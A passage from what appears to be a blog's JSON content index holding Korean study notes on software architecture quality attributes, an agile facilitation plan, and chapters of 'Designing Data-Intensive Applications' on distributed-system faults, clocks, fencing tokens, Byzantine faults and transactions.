http://shinhodong1.cafe24.com/?page_id=12730","categories":[],"tags":[{"name":"interior","slug":"interior","permalink":"https://blog.devkwang.app/tags/interior/"}]},{"title":"invitation-software-architecture-1","slug":"invitation-software-architecture","date":"2020-10-30T07:39:29.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/10/30/invitation-software-architecture/","link":"","permalink":"https://blog.devkwang.app/2020/10/30/invitation-software-architecture/","excerpt":"","text":"아키텍처 설계와 상세 설계 아키텍처 기반 개발 요구사항 아키텍처 상세설계 구현 설계 차이점 기능 요구 사항 (전통 설계) vs 도메인 개체 식별 및 서브 시스템 그룹핑(객체 설계) vs 품질 요구사항 (아키 설계) 도메인 개체 식별 및 서브 시스템 그룹핑 정의는 재사용성과 유지 보수성의 반영에 지나지 않는다. 요구되는 다양한 품질 충족에 주된 관심사를 두고 이들 간의 상충관계를 분석하고 대안 아키텍처 전략 중 선택 아키 기반 설계 : 컴포넌트들의 식별과 커넥터들의 구성에 초점 객체 기반 설계 : 객체의 식별로 부터 시작(bottom-up) architecture 12 factors 아키텍처 드라이버 시스템 요구사항(System Requirement)의 분류 기능 요구사항 (functional Requirement) : 시스템이 특정한 입력에 대해 어떻게 반응하고 특정 상황에서 어떻게 동작해야 하는가를 기술 비기능 요구사항(non-functional Requirement) 품질 요구사항(quality requirement) : 성능(Performance), 신뢰성(Reliability), 사용용이성(Usability), 진화성(Evolvability), 확장개발성(extensibility), 규모확장성(scalability) 제약사항(constraints) : 개발시간, 개발공정, 준수하여야 하는 표준 아키텍처 프레임 드라이버 개발대상 시스템의 도메인, 환경 및 추상수준을 결정하는 요소 개발 대상 소프트웨어가 존재하는 context에 따라 설계 대상 아키텍처가 들어가는 적절한 아키텍처 프레임이 달라진다. 아키텍처 프레임을 결정짓는 아키텍처 프레임 드라이버가 있다. ex) “개발대상 소프트웨어는 지역적으로 분산된 정보시스템이다.” , “J2EE를 기반으로 한 클라이언트 서버 형 분산 소프트웨어 등이다.” 품질속성, 검증가능성, 품질 속성 시나리오 품질속성 고객들이 요구하는 품질 요구사항들은 다양하며 이들을 분류할 수 있는 명칭을 가진다 이를 품질속성 (quality attribute)라고 부른다. “시스템이 하루 23시간 이상 서비스를 제공하여야 한다” 는 요구사항이 있다면 이를 간략히 가용성(availability)이라는 품질속성 명칭을 이용하여 &quot;시스템이 높은 가용성을 가져야 한다&quot;고 말할 수 있다. 품질속성 종류 개발 관정 : 재사용성, 변경용이성, 확장개발성, 유지보수성, 이식성, 구축용이성, 시험용이성, 이해용이성 실행 관점 : 신뢰성, 성능, 가용성, 사용용이성, 안전성, 보안성, 규모확장성 검증가능성 요구사항 충족여부를 판단할 수 있는가? 품질 요구사항이 검증 가능한 형태를 가지고 있지 않다면 검증 가능한 형태로 먼저 가공해야한다. 품질 시나리오 템플릿 소스(source) : 자극(stimulus)을 생성하는 개체 자극(stimulus) : 시스템에 영향을 주는 조건 산출물(artifact) : 자극에 의하여 영향을 받는 시스템의 부분 환경(environment) : 자극이 발생한 조건 반응(response) : 자극 때문에 발생하는 활동 반응척도(response measure) : 시스템의 반응을 평가하는 척도 아키텍처 설계 문제 분석 아키텍처 설계문제의 식별, 정리 및 해결책의 후보를 도출하는 활동 아키텍처 설계문제 분석원","categories":[],"tags":[]},{"title":"agile-facilitating","slug":"agile-facilitating","date":"2020-10-29T08:42:36.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/10/29/agile-facilitating/","link":"","permalink":"https://blog.devkwang.app/2020/10/29/agile-facilitating/","excerpt":"","text":"facilitating example 그룹원간 친목도모 참석자 : 5인 시간 : 50분 목적 : 친목도모 활동 계획 수립 Time Table 10시 반 (점심시간 전 50분 타임어택) 10분 : 아이스 브레이킹 (커피 사러 나가기) 15분 : 브레인 스토밍(다과, 음료, 장소, 식사 4가지 카테고리로 발산형 대화) 15분 : jk methods, payoff matrix 만들기 10분 : 리스트 선정 및 계획 수립","categories":[],"tags":[{"name":"agile","slug":"agile","permalink":"https://blog.devkwang.app/tags/agile/"},{"name":"facilitating","slug":"facilitating","permalink":"https://blog.devkwang.app/tags/facilitating/"}]},{"title":"designing-data-intensive-application-8","slug":"designing-data-intensive-application-8","date":"2020-10-29T07:49:49.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/10/29/designing-data-intensive-application-8/","link":"","permalink":"https://blog.devkwang.app/2020/10/29/designing-data-intensive-application-8/","excerpt":"","text":"분산 시스템에서의 비관주의 어떤 것이든지 잘못될 가능성이 있다면 잘못된다. 결함과 부분 장애 하드웨어가 올바르게 동작하면 같은 연산은 항상 같은 결과를 낸다(결정적이다.). 분산 시스템에서 시스템의 어떤 부분은 잘 동작하지만 다른 부분은 예측할 수 없는 방식으로 고장나는 것을 부분 장애(partial failure)라고 한다. 부분장애는 비결정적이라서 다루기가 어렵다. 클라우드 컴퓨팅과 슈퍼 컴퓨팅 대규모 컴퓨팅의 끝에는 고성능 컴퓨팅(high-performance computing, HPC)분야가 있다. 다른 극단에는 클라우드 컴퓨팅이 있다. 전통적인 기업형 데이터센터는 이 두 극단의 중간 지점에 있다. 인터넷 서비스를 구현하는 것은 집중으로 할때의 관점 언제라도 사용자에게 지연 시간이 낮은 서비스를 제공해야 한다. 수리를 위해 클러스터를 중단시키는 것처럼 서비스를 이용할수 없게 하는 것은 허용되지 않는다. 슈퍼 컴퓨터는 전형적으로 특화된 하드웨어를 사용해 구축한다. 노드는 신뢰성이 높고 공유메모리, remote direct memory access를 사용해 통신한다. 반면, 클라우드 서비스의 노드는 사용ㅇ 장비를 사용해 구축한다. 규모의 경제 덕에 낮은 비용으로 동일한 성능을 제공하지만 실패율이 높다. 거대한 데이터선테의 네트워크는 흔히 IP와 이더넷을 기반으로 하며, 높은 양단 대역폭(bisection bandwidth)를 제공하기 위해 Clos topology로 연결되어 있다. 슈퍼컴퓨터는 통신 패턴이 정해진 HPC 작업부하에서 높은 성능을 보여주는 다차원 Mesh나 torus 같은 특화 네트워크 토폴로지를 자주 사용한다. 신뢰성 없는 네트워크 각 장비는 자신만의 메모리와 디스크를 갖고 있고 다른 장비의 메모리나 디스크에 접근할 수 없다고 가정 asynchronous packet network (비동기 패킷 네트워크) : 노드는 다른 노드로 메시지(패킷)를 보낼 수 있지만 네트워크는 메시지가 언제 도착할지 혹은 메시지가 도착히기는 할 것인지 보장하지 않는다. 요청이 손실됐을 수 있다. (누군가 네트워크 케이블을 뽑았을지도 모른다.) 요청이 큐에서 대기하다가 나중에 전송될 수 있다. (네트워크나 수신자에 과부하가 걸렸을 수 있다.) 원격 노드에 장애가 생겼을 수 있다.(죽었거나 전원이 나갔을 수 있다.) 원격 노드가 일시적으로 응답하기를 멈췄지만 나중에는 다시 응답하기 시작할 수 있다. 원격 노드가 요청을 처리했지만 응답이 네트워크에서 손실됐을 수 있다. 원격 노드가 요청을 처리했지만 응답이 지연되다가 나중에 전송될 수 있다. (네트워크나 수신자에 과부하가 걸렸을 수 있다.) 비동기 네트워크에서 이런 문제를 다루는 흔한 방법은 타임아웃이다. 현실의 네트워크 결함 인적 오류 스위치의 소프트웨어 업그레이드 중 생기는 문제는 네트워크 토폴로지 재구성을 유발 상어가 해저 케이블을 물어 뜯음 수신 패킷은 전부 누락, 송신 패킷은 잘 보내는 네트워크 인터페이스가 있음 (네트워크 링크가 한 방향으로 동작한다고 해서 반대 방향도 동작하리라고 보장되는 것은 아님) 반드시 네트워크 결함을 견뎌내도록(tolerating) 처리할 필요는 없다. 그러나 시스템이 그로부터 복구할 수 있도록 보장해야 한다. 결함 감지 많은 시스템은 결함 있는 노드를 자동으로 감지할 수 있어야 한다. 로드 밸런서는 죽은 노드로 요청을 그만 보내야 한다 단일 리더 복제를 사용하는 분산 데이터베이스에서 리더에 장애가 나면 팔로워 중 하나가 리더로 승격돼야 한다. 특정한 상황에서는 뭔가 동작하지 않는다고 명시적으로 알려주는 피드백을 받을 수 있다. 노드가 실행 중인 장비에 연결할 수는 있지만 목적지 포트에서 수신 대기하는 프로세스가 없다면 운영체제가 RST, FIN패킷을 보내 TCP 연결을 닫거나 거부한다. 그러나 노드가 요청을 처리하다 죽었다면 데이터가 실제로 얼마나 처리 됐는지 알 방법이 없다. 노드 프로세스가 죽었지만 노드의 운영체제는 아직 실행 중이라면 스크립트로 다른 노드에게 프로세스가 죽었다고 알려서 다른 노드가 타임아웃이 만료되기를 기다릴 필요 없이 빠르게 역할을 넘겨 받을 수 있게 할 수 있다. (HBASE) 데이터센터 내 네트워크 스위치 관리 인터페이스에 접근할 수 있으면 질의를 보내 하드웨어 수준의 링크 장애를 감지 할 수 있다. 접속하려는 IP 주소에 도달할 수 없다고 라우터가 확신하면 ICMP Destination Unreachable 패킷으로 응답할 수도 있다. 그러나 라우터가 마법 같은 장애 감지 능력이 없다면 네트워크의 다른 참여자들과 동일한 제한이 적용된다. 원격 노드가 다운되고 있다는 빠른 피드백은 유용하지만 여기에 의존할 수는 없다. TCP가 패킷이 전달됐다는 확인 응답(ack)을 했더라도 애플리케이션이 그것을 처리하기 전에 죽을 수 있다. 요청이 성공했음을 확신하고 싶다면 애플리케이션 자체로부터 긍정 응답을 받아야 한다. 타임아웃과 기약 없는 지연 타임아웃이 길면 노드가 죽었다고 선언될 때까지 기다리는 시간이 길어진다. 타임아웃이 짧으면 결함을 빨리 발견하지만 노드가 일시적으로 느려졌을 뿐인데도 죽었다고 잘못 선언할 위험이 높아진다. 성급하게 노드가 죽었다고 선언하면 문제가 된다. 노드가 실제로는 살아 있고 어떤 동작을 실행하는 중일 때 다른 노드가 역할을 넘겨 받으면 그 동작을 두 번 실행하게 될 지도 모른다. 노드가 죽었다고 선언되면 그 노드의 책무는 다른 노드로 전달돼야 해서 다른 노드와 네트워크 추가적인 부하를 준다. 시스템이 높은 부하에 허덕이는 중이라면 성급하게 노드가 죽었다고 선언하는 것은 문제를 악화시킬 수 있다. 노드가 실제로는 죽지 않았고 과부하 때문에 응답이 느릴뿐일 수도 있다. 만약 그 노드의 부하를 다른 노드로 전달하면 연쇄 장애를 유발할 수 있다. 비동기 네트워크는 기약 없는 지연(unbounded delay)가 있고, 서버 구현은 대부분 어떤 최대 시간 내에 요청을 처리한다고 보장할 수 없다. 시스템이 대부분의 시간에 빠르다는 것은 장애 감지에 충분치 않다. 네트워크 혼잡과 큐 대기 여러 다른 노드가 동시에 같은 목적지로 패킷을 보내려고 하면 네트워크 스위치는 패킷을 큐에 넣고 한 번에 하나씩 목적지 네트워크 링크로 넘겨야 한다. Network congestion(네트워크 혼잡) : 네트워크 링크가 붐비면 패킷은 슬롯을 얻을 수 있을 때까지 잠시 기다려야 할 수도 있다. 패킷이 목적지 장비에 도착했을 때 모든 CPU 코어가 바쁜 상태라면 네트워크에서 들어온 요청은 애플리케이션에서 처리할 준비가 될 때까지 운영체제가 큐에 넣어둔다. 가상 환경에서 실행되는 운영체제는 다른 가상 장비가 CPU 코어를 사용하는 동안 수십 밀리초 동안 멈출 때가 흔하다. 이 시간 동안 가상 장비는 네트워크에서 어떤 데이터도 받아들일 수 없으므로 가상 장비 모니터가 들어오는 데이터를 큐에 넣어서 네트워크 지연의 변동성을 더욱 증가시킨다. TCP는 흐름 제어(Flow Control)를 수행한다. Congestion avoidance(혼잡 회피)나 Backpressure(배압) 이라고도 하는 흐름 제어는 노드가 네트워크 링크나 수신 노드에 과부하를 가하지 않도록 자신의 송신율을 제한하는 것이다. 데이터가 네트워크로 들어가기 전에도 부가적인 큐 대기를 할 수 있다는 뜻이다. 공개 클라우드와 멀티 테넌트 데이터센터에서는 여러 소비자가 자원을 공유한다. 네트워크 링크와 스위치, 각 장비의 네트워크 인터페이스와 CPU도 공유한다. MapReduce(맵리듀스) 같은 일괄 처리 작업 부하는 네트워크 링크를 포화시키기 쉽다. 공유된 자원을 다른 사용자가 사용하는 것을 제어하거나 간파할 수 없으므로 자원을 많이 사용하는 누군가가 가까이 있다면 네트워크 지연 변동이 클 수 있다. 위와 같은 환경에서는 실험적으로 타임아웃을 선택하는 수 밖에 없다. 애플리케이션의 특성을 고려해 장애 가밎 지연과 너무 이른 타임아웃의 위험성 사이에서 적절한 트레이드오프를 결정할 수 있다. 더 좋은 방법은 고정된 타임아웃을 설정하는 대신 시스템이 지속적으로 응답 시간과 그들의 변동성(Jitter)을 측정하고 관촬된 응답 시간 분포에 따라 타임아웃을 자동으로 조절하게 하는 것이다. Phi Accrual failure detector(파이 증가 장애 감지기)를 쓰면 된다. 패킷 교환 방식 Bursty traffic(순간적으로 몰리는 트래픽)에 최적화 Quality of Service : 패킷에 우선순위를 매기고 스케쥴링 Admission control(진입 제어) : 전송 측에서 전송률을 제한 신뢰성 없는 시계 시계와 시간은 중요하다. 애플리케이션은 다음과 같은 질문에 대답하기 위해 다양한 방식으로 시계에 의존한다. 이 요청이 타임아웃됐나? 이 서비스의 99분위 응답 시간은 어떻게 되나? 이 서비스는 지난 5분 동안 평균 초당 몇개의 질의를 처리했나? 사용자가 우리 사이트에서 시간을 얼마나 보냈나? 이 기사가 언제 게시됐나? 며칠 몇 시에 미리 알림 이메일을 보내야 하나? 이 캐시 항목은 언제 만료되나? 로그 파일에 남은 이 오류 메세지의 타임스탬프는 무엇인가? 네트워크에 있는 개별 장비는 자신의 시계를 갖고 있다. 보통 Quartz crystal oscillator(수정 발진기)이다. 이 장치는 완벽하지는 않아서 각 장비는 자신만의 시간 개념이 있으며 이는 다른 장비보다 약간 빠를 수도 느릴 수도 있다. 시간을 동기화 할때 Network Time Protocol(NTP)로 서버 그룹에서 보고한 시간에 따라 컴퓨터 시계를 조정 할 수 있게 한다. 이 서버들은 GPS 수신자 같은 더욱 정확한 시간 출처로부터 시간을 얻는다. 단조 시계 대 일 기준 시계 일 기준 시계(time of day clock) 어떤 달력에 따라 현재 날짜와 시간을 반환한다. Linux의 clock_gettime(CLOCK_REALTIME)과 자바의 System.currentTimeMillis()는 epoch(에포크) 이래로 흐른 밀리초 수를 반환한다. 윤초는 세지 않고 에포크는 그레고리력을 따랐을 경우 UTC(협정세계시) 1970년 1월 1일 자정을 가리킨다. NTP 동기화한다. Coarse-grained 해상도를 가진다. 예를 들어 오래된 윈도우 시스템에서는 10밀리초 단위로 흐른다. 최근의 시스템에서는 이게 별 문제가 되진 않는다. 단조 시계(monotonic clock) 단조 시계라는 이름은 항상 앞으로 흐른다는 사실에서 나왔다. Linux의 clock_gettime(CLOCK_MONOTONIC)과 자바의 System.nanoTime()이 있다. 한 시점에서 단조 시계의 값을 확인하고 어떤 일을 한 후 나중에 다시 시계를 확인할 수 있다. 두 값사이의 차이로 두 번의 확인 사이에 얼마나 시간이 흘렀는지 알 수 있다. 그러나 시계의 절대적인 값은 의미가 없다. 컴퓨터가 시작한 이래 흐른 나노초 수일 수도 있고 비슷한 어떤 것일 수도 있다. 두개의 다른 컴퓨터에서 나온 단조 시계 값을 비교하는 것은 의미가 없다. 여러 개의 CPU 소켓이 있는 서버는 CPU마다 독립된 타이머가 있을 수도 있다. 이 타이머는 다른 CPU와 반드시 동기화되는 것은 아니다. 운영체제는 차이를 보정해서 애플리케이션 스레드가 여러 CPU에 걸쳐 스케쥴링 되더라도 시계가 단조적으로 보이게 하려 노력한다. 그러나 단조성 보장은 곧이 곧대로 받아들이지 않는 게 현명하다. NTP는 컴퓨터의 로컬 시계가 NTP 서버보다 빠르거나 느리다는 것을 발견하면 단조 시계가 진행하는 진도수를 조정할 수도 있다. 기본적으로 NTP는 시계 속도를 0.05%까지 올리거나 내리는 것을 허용하지만 단조 시계가 앞이나 뒤로 뛰게 할 수는 없다. 단조 시계의 해상도는 보통 상당히 좋아 마이크로초나 그 이하 단위로 측정이 가능하다. 분산 시스템에서 경과 시간을 재는 데 단조 시계를 쓰는 것은 일반적으로 괜찮다. 다른 노드의 시계 사이에 동기화가 돼야 한다는 가정이 없고 측정이 약간 부정확해도 민감하지 않기 때문이다. 시계 동기화와 정확도 컴퓨터의 수정 시계는 아주 정확하지는 않다. Drift 현상이 생기며 시계 드리프트는 장비의 온도에 따라 변한다. 구글은 자신들의 서버에 200ppm(parts per million)의 시계 드리프트가 있다고 가정한다. 컴퓨터 시계가 NTP 서버와 너무 많은 차이가 나면 동기화가 거부되거나 시계가 강제로 리셋될 수도 있다. 리셋 전 후에 시간을 관찰한 애플리케이션은 시간이 거꾸로 흐르거나 갑자기 앞으로 뛰는 것을 볼지도 모른다. NTP 동기화는 잘해야 네트워크 지연만큼만이 좋을 수 있다. 혼잡한 네트워크에서는 정확도에 한계가 있다. 윤초가 발생하면 1분의 길이가 59초나 61초가 되어 윤초를 고려하지 않고 설계된 시스템에서는 시간에 관한 가정이 엉망이 되어버린다. 현실에서 실제 NTP 서버의 동작은 다양하지만 윤초를 처리하는 최선의 방법은 윤초 조정을 하루에 걸쳐서 서서히 수행함으로써 NTP서버가 “거짓말을 하게” 하는 것일 수도 있다. (Smearing(문지름)이라고 부른다) 고빈도 트레이딩 펀드는 UTC와 100마이크로초 이내로 동기화를 요구하고 이는 Flash Crash(플래시 크래시 : 주가나 채권 금리가 급락하는 상황)같은 시장 이상 현상을 디버깅하고 시장 조작을 감지하는 데 도움되게 만들기 위해서다. 동기화된 시계에 의존하기 NTP 클라이언트가 잘못 설정됐다면 시계는 드리프트가 생겨서 점점 실제 시간으로부터 멀어져 가지만 대부분이 잘 동작하는 것처럼 보인다. 동기화된 시계가 필요한 스프트웨어를 사용한다면 필수적으로 모든 장비 사이의 시계차이를 모니터링 해야한다. 다른 노드와 시계가 너무 차이나는 노드는 죽은 것으로 선언되고 클러스터에서 제거 돼야 한다. 충돌 해소 전략 Last Write Wins(LWW : 최종 쓰기 승리) 다중 리더 복제와 카산드라와 리악같은 리더 없는 데이터베이스에서 널리 사용된다. 데이터베이스 쓰기가 불가사의하게 사라질 수 있다. 시계가 뒤처지는 노드는 시계가 빠른 노드가 먼저 쓴 내용을 그들 사이에 차이나는 시간이 흐를 때까지 덮어쓸 수 없다. LWW는 순차적인 쓰기가 빠른 시간 내에 연속으로 실행되는 것과 진짜 동시에 쓰기가 실행 되는 것을 구별할 수 없다. 인과성 위반을 막으려면 버전 벡터 같은 부가적인 인과성 추적 메커니즘이 필요하다. 두 노드가 독립적으로 동일한 타임스탬프를 가진 쓰기 작업을 만들 수도 있다. 시계의 해상도가 밀리초 단위 밖에 안되면 그렇다. 같은 값을 다르게 만들어줄 부가적인 값이 필요하지만 이 방법도 인과성 위반으로 이어질 수 있다. 전역 스냅숏용 동기화된 시계 스냅숏 격리 : 작고 빠른 읽기 쓰기 트랜잭션과 크고 오래 실행되는 읽기 전용 트랜잭션 모두를 지원해야 하는 데이터베이스에서 아주 유용한 기능 잠금을 쓰지 않고 읽기 쓰기 트랜잭션을 방해하지 않으면서 읽기 전용 트랜잭션이 특정 시점의 일관적인 상태에 있는 데이터베이스를 볼 수 있게 한다. 단조 증가 Transaction ID : 스냅숏보다 나중에 쓰기가 실행 됐다면 그 내용은 스냅숏 트랜잭션 에게 보이지 않는다. 데이터베이스가 여러 데이터센터에 있는 여러 장비에 분산돼 있을 때는 코디네이션이 필요하므로 전역 단조 증가 트랜잭션 ID를 생성하기 어렵다. 작고 빠른 트랜잭션이 많으면 분산 시스템에서 트랜잭션 ID 생성은 방어할 수 없는 병목이 된다. 가장 이른 타임스탬프와 가장 늦은 타임스탬프를 포함하는 두 개의 신뢰 구간이 있고 (A=[Aearliest,Alatest])(A = [A_{earliest},A_{latest}])(A=[Aearliest​,Alatest​]) 와 (B=[Bearliest,Blatest])(B = [B_{earliest},B_{latest}])(B=[Bearliest​,Blatest​]) 라는 두 구간이 겹치지 않는다면 (즉 Aearliest&lt;Alatest&lt;Bearliest&lt;BlatestA_{earliest} &lt; A_{latest} &lt; B_{earliest} &lt; B_{latest}Aearliest​&lt;Alatest​&lt;Bearliest​&lt;Blatest​) B는 분명이 A보다 나중에 실행됐다. 구간이 겹칠 때만 A와 B가 어떤 순서로 실행됐는지 확신할 수 없다. 프로세스 중단 파티션마다 리더가 하나씩 있는 데이터베이스가 있다고 가정할 때, 리더만 쓰기를 받아들이도록 허용된다면 노드가 여전히 리더인지 그리고 안전하게 쓰기를 받아들일 수 있을지 어떻게 알 수 있을까? 한 가지 선택은 리더가 다른 노드들로부터 임차권(lease)을 얻는 것이다. 123456789101112while(true) &#123; request = getIncomingRequest(); // 항상 임차권이 적어도 10초는 남아 있게 보장한다. if(lease.expiryTimeMillis - System.currentTimeMillis() &lt; 10000) &#123; lease = lease.renew(); &#125; if(lease.isValid()) &#123; process(request); &#125;&#125; 위 코드에서 잘못된점 : 동기화된 시계 의존, 로컬 단조 시계만 사용하도록 프로토콜을 수정하더라도 process(request) 사이 매우 짧은 시간이 흐른다고 가정한다. 쓰레드가 오랫동안 멈출 수 있다고 가정 “stop-the-world” GC 가상환경에서 가상장비는 서스펜드(suspend, 모든 프로세스 실행을 멈추고 메모리 내용을 디스크에 저장)됐다가 재개 될수 있다. 이 기능은 라이브 이전하는데 사용되는데, 이 경우 중단 시간의 길이는 프로세스가 메모리에 쓰는 속도에 의존한다. 운영체제가 다른 스레드로 컨텍스트 스위치하거나 하이퍼바이저가 다른 가상 장비로 스위치되면 현재 실행 중인 스레드는 코드의 임의 지점에서 멈출 수 있다. 이를 스틸 타임(steal time)이라고 한다. 장비의 부하가 높으면(실행 대기 스레드의 큐가 길면) 중단 스레드가 다시 실행 되는 데 시간이 좀 걸릴 수도 있다. 애플리케이션이 동기식으로 디스크에 접근하면 스레드가 느린 디스크 I/O 연산이 완료되기를 기다리느라 중단될 수 있다. ex) 자바 클래스로더는 클래스 파일이 처음 사용될 때 지연 로딩하는데, 이는 프로그램 실행 중 언제라도 일어날 수 있다. 심지어 I/O 중단과 GC 중단이 공모해서 지연을 결합하기도 한다. 디스크가 실제로는 네트워크 파일시스템이거나 네트워크 블록 장치라면 I/O 지연 시간은 네트워크 지연의 변동성에도 종속적이다. 운영체제가 디스크로 스왑(페이징) 할 수 있게 설정됐다면 단순한 메모리 접근만 해도 페이지를 디스크에서 메모리로 로딩하게 하는 페이지 폴트가 발생할 수 있다. 이 경우 스레드는 멈춘다 메모리 압박이 높으면 이어서 다른 페이지가 디스크로 스오바될 수 있다. 극단적인 환경에서는 운영체제가 페이지를 메모리 안팎으로 스와핑하느라 대부분의 시간을 쓰고 실제 작업을 거의 못할 수 있다. 이를 Thrashing(스래싱)이라고 한다. 이 문제를 피하기 위해 서버 장비에서 페이징은 종종 비활성화 된다. 유닉스 프로세스는 SIGSTOP 신호를 보내 멈출 수있다. 이런 경우 스레드를 어떤 시점에 선점(preempt)하고 얼마간의 시간이 흐른 후 재개할 수 있다. 선점된 스레드는 이를 알아채지 못한다. 이 문제는 단일 장비에서 다중 스레드 코드를 스레드 안전(thread-safe)하게 만드는 것과 비슷하다. 컨텍스트 스위치가 임의로 발생할 수 있고 병렬성(parallelism)이 발생할 수도 있으므로 타이밍에 대해 어떤 가정도 할 수 없다. Thread-safe Mutex(뮤택스), Semaphore(세마포어), Atomic Counter(원자적 카운터), Lock-free(잠금 없는) data structure, blocking queue fencing token 펜싱 토큰 잠금 서버가 잠금이나 임차권을 승인할 때마다 fencing token(펜싱 토큰)도 반환한다고 가정한다. 펜싱 토큰은 잠금이 승인될 때마다 증가하는 수자다. Byzantine fault (비잔틴 결함) 펜싱 토큰은 부주의에 의한 오류에 빠진 노드를 감지하고 차단할 수 있다. ex) 자신의 임차권이 만료됐다는 것을 아직 알아채지 못한 경우 노드들이 신뢰성은 없지만 정직하다고 가정한다. 노드들은 결함 때문에 느리거나 결코 응답하지 않을 수 있고 그들의 상태는 뒤처질 수도 있지만 노드가 응답한다면 그 노드는 &quot;진실&quot;을 말한다고 가정한다. 분산 시스템 문제는 노드가 “거짓말” (임의의 결함이 있거나 오염된 응답을 보냄)을 할지도 모른다는 위험이 있다면 훨씬 더 어려워진다. ex) 어떤 노드가 실제로는 받지 않은 특정 메세지를 받았다고 주장할 수도 있다. 이런 동작을 Byzantine fault 라고 하며 이렇게 신뢰할 수 없는 환경에서 합의에 도달하는 문제를 Byzantine Generals Problem 이라고 한다. 일부 노드가 오작동하고 프로토콜을 준수하지 않거나 악의적인 공격자가 네트워크를 방해하더라도 시스템이 계속 올바르게 동작한다면 이 시스템은 Byzantine fault tolerant (비잔틴 내결함성)을 지닌다. ex) 항공우주 산업 환경에서 컴퓨터의 메모리가 CPU 레지스터에 저장된 데이터는 방사선에 오염돼서 그 컴퓨터가 다른 노드에게 전혀 예측할 수 없는 방식으로 반응할 수 있다. 시스템 장애는 매우 비용이 크므로 비행 제어 시스템은 비잔틴 결함을 견딜 수 있어야 한다. ex) 여러 조직이 참여하는 시스템에서 어떤 참여자들은 다른 사람을 속이거나 사취하려고 할지도 모른다. 이런 환경에서는 노드가 다른 노드의 메세지를 그냥 믿는 것은 안전하지 않다. 메시지 악의를 가지고 보내졌을 수 있기 때문이다. 이를테면 서로 신뢰할 수 없는 단체들이 중앙 권한에 기대지 않고 트랜잭션이 발생했는지 아닌지를 판단하는 방법으로 비트코인(Bitcoin)이나 다른 블록체인 같은 Peer to Peer 네트워크를 고려할 수 있다. 웹 애플리케이션은 최종 사용자가 제어하는 웹브라우저 같은 클라이언트 행동이 임의적이고 악의적이라고 예상해야 한다. input validation(입력 확인), sanitization(살균), output escaping(출력 이스케이핑)이 매우 중요한 이유다. SQL injection(SQL 주입 공격)과 Cross Site Scripting(크로스 사이트 스크립팅) 을 막야아한다. 약한 형태의 거짓말 노드들이 일반적으로 정직하다고 가정하지만 약한 형태의 “거짓말” (예를 들어 하드웨어 문제, 소프트웨어 버그, 잘못된 설정 때문에 유효하지 않는 메시지)로부터 보호해주는 메커니즘을 소프트웨어에 추가하는게 가치가 있을수도 있다. 네트워크 패킷은 때때로 하드웨어 문제나 운영체제, 드라이버, 라우터 등의 버그 때문에 오염된다. 보통 오염된 패킷은 TCP와 UDP에 내장된 체크섬으로 검출되지만 때로는 검출을 피하는 경우도 있다. 이런 오염으로부터 보호하려면 보통 애플리케이션 수준 프로토콜에서 체크섬을 쓰는 것처럼 단순한 수단을 쓰면 충분하다. 공개적으로 접근 가능한 애플리케이션은 사용자 입력을 신중하게 살균해야 한다. ex) 값이 합당한 범위에 속하는지 확인하고 메모리를 대량으로 할당해서 서비스 거부가 발생하지 않도록 문자열의 크기를 제한해야 한다. ex) 방화벽 뒤에 있는 내부 서비스는 입력 확인을 덜 엄격하게 할 수도 있겠지만 입력값에 대해 기본적인 sanity-checking(정상성 점검)을 하는게 좋다. NTP 클라이언트는 여러 서버 주소를 설정할 수 있다. 동기화를 할 때 클라이언트는 모든 서버에 접속해서 그들의 오차를 수정한 후 서버 중 다수가 어떤 시간 범위에 동의하는지 확인할 수 있다.대다수의 서버들이 정상이기만 하면 잘못된 시간을 보고하는 잘못 설정된 NTP 서버를 이상치로 검출해서 동기화 대상에서 제거할 수 있다. NTP에 여러 서버를 사용하면 서버 한 대를 쓸 때보다 견고해진다. 시스템 모델과 현실 동기식 모델 동기식 모델은 네트워크 지연, 프로세스 중단, 시계 오차에 모두 제한이 있다고 가정한다. 시계가 정확하게 동기화된다거나 네트워크 지연이 없다고 암시하는 것은 아니다. 네트워크 지연, 중단, 시계 드리프트가 결고 어떤 고정된 상한치를 초과하지 않는 것임을 안다는 것 뿐이다. 동기식 모델은 기약 없는 지연과 현실 시스템 대부분에서 현실적인 모델이 아니다.","categories":[],"tags":[]},{"title":"designing-data-intensive-application-7","slug":"designing-data-intensive-application-7","date":"2020-09-28T02:27:19.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/09/28/designing-data-intensive-application-7/","link":"","permalink":"https://blog.devkwang.app/2020/09/28/designing-data-intensive-application-7/","excerpt":"","text":"현실세계 문제점 데이터베이스 소프트웨어나 하드웨어는 언제라도 실패할 수 있다. 애플리케이션은 언제라도 죽을 수 있다. 네트워크가 끊기면 애플리케이션과 데이터베이스의 연결이 갑자기 끊기거나 데이터베이스 노드 사이의 통신이 안 될 수 있다. 여러 클라이언트가 동시에 데이터베이스에 쓰기를 실행해서 다른 클라이언트가 쓴 내용을 덮어쓸 수 있다. 클라이언트가 부분적으로만 갱신돼서 비정상적인 데이터를 읽을 수 있다. 클라이언트 사이의 경쟁 조건은 예측하지 못한 버그를 유발할 수 있다. Transaction mechanism 애플리케이션에서 몇 개의 읽기와 쓰기를 하나의 논리적 단위로 묶는 방법이다. 개념적으로 한 트랜잭션 내의 모든 읽기와 쓰기는 한 연산으로 실행된다. 트랜잭션은 전체가 성공하거나 실패한다. ACID 테오 하더(Theo Harder), 안드레아스 로이터(Andreas Reuter)는 데이터 베이스에서 내결함성 메커니즘을 나타내는 용어를 확립했다. Atomicity(원자성) Consistency(일관성) Isolation(격리성) Durability(지속성) 그러나 현실에서는 데이터베이스마다 ACID구현이 제각각이다. ACID compliant 한다고 할때 그 시스템에서 실제로 어떤 것을 기대할 수 있는지 분명하지 않다. (ACID 표준을 따르지 않는 시스템은 때로 BASE라고 불린다.) Basically Available Atomicity Soft state Eventual Consistency Atomicity 일반적으로 원자적이란 더 작은 부분으로 쪼갤 수 없는 뭔가를 가리킨다. 시스템은 연산을 실행하기 전이나 실행한 후의 상태에만 있을 수 있으며 그 중간 상태에는 머물수 없다. ACID의 맥락에서 보면 원자성은 동시성과 관련이 없다. 여러 쓰기 작업이 하나의 원자적 인 트랜잭션으로 묶여 있는데 결함 때문에 왼료(커밋)될 수 없다면 어보트되고 데이터베이스는 이 트랜잭션에서 지금끼지 실행한 쓰기를 무시하거나 취소해야 한다. 어보트 능력 (abortability)이 원자성 보다 나은 단어겠지만 원자성이 자주 쓰이므로 이 단어를 계속 사용하겠다. Consistency 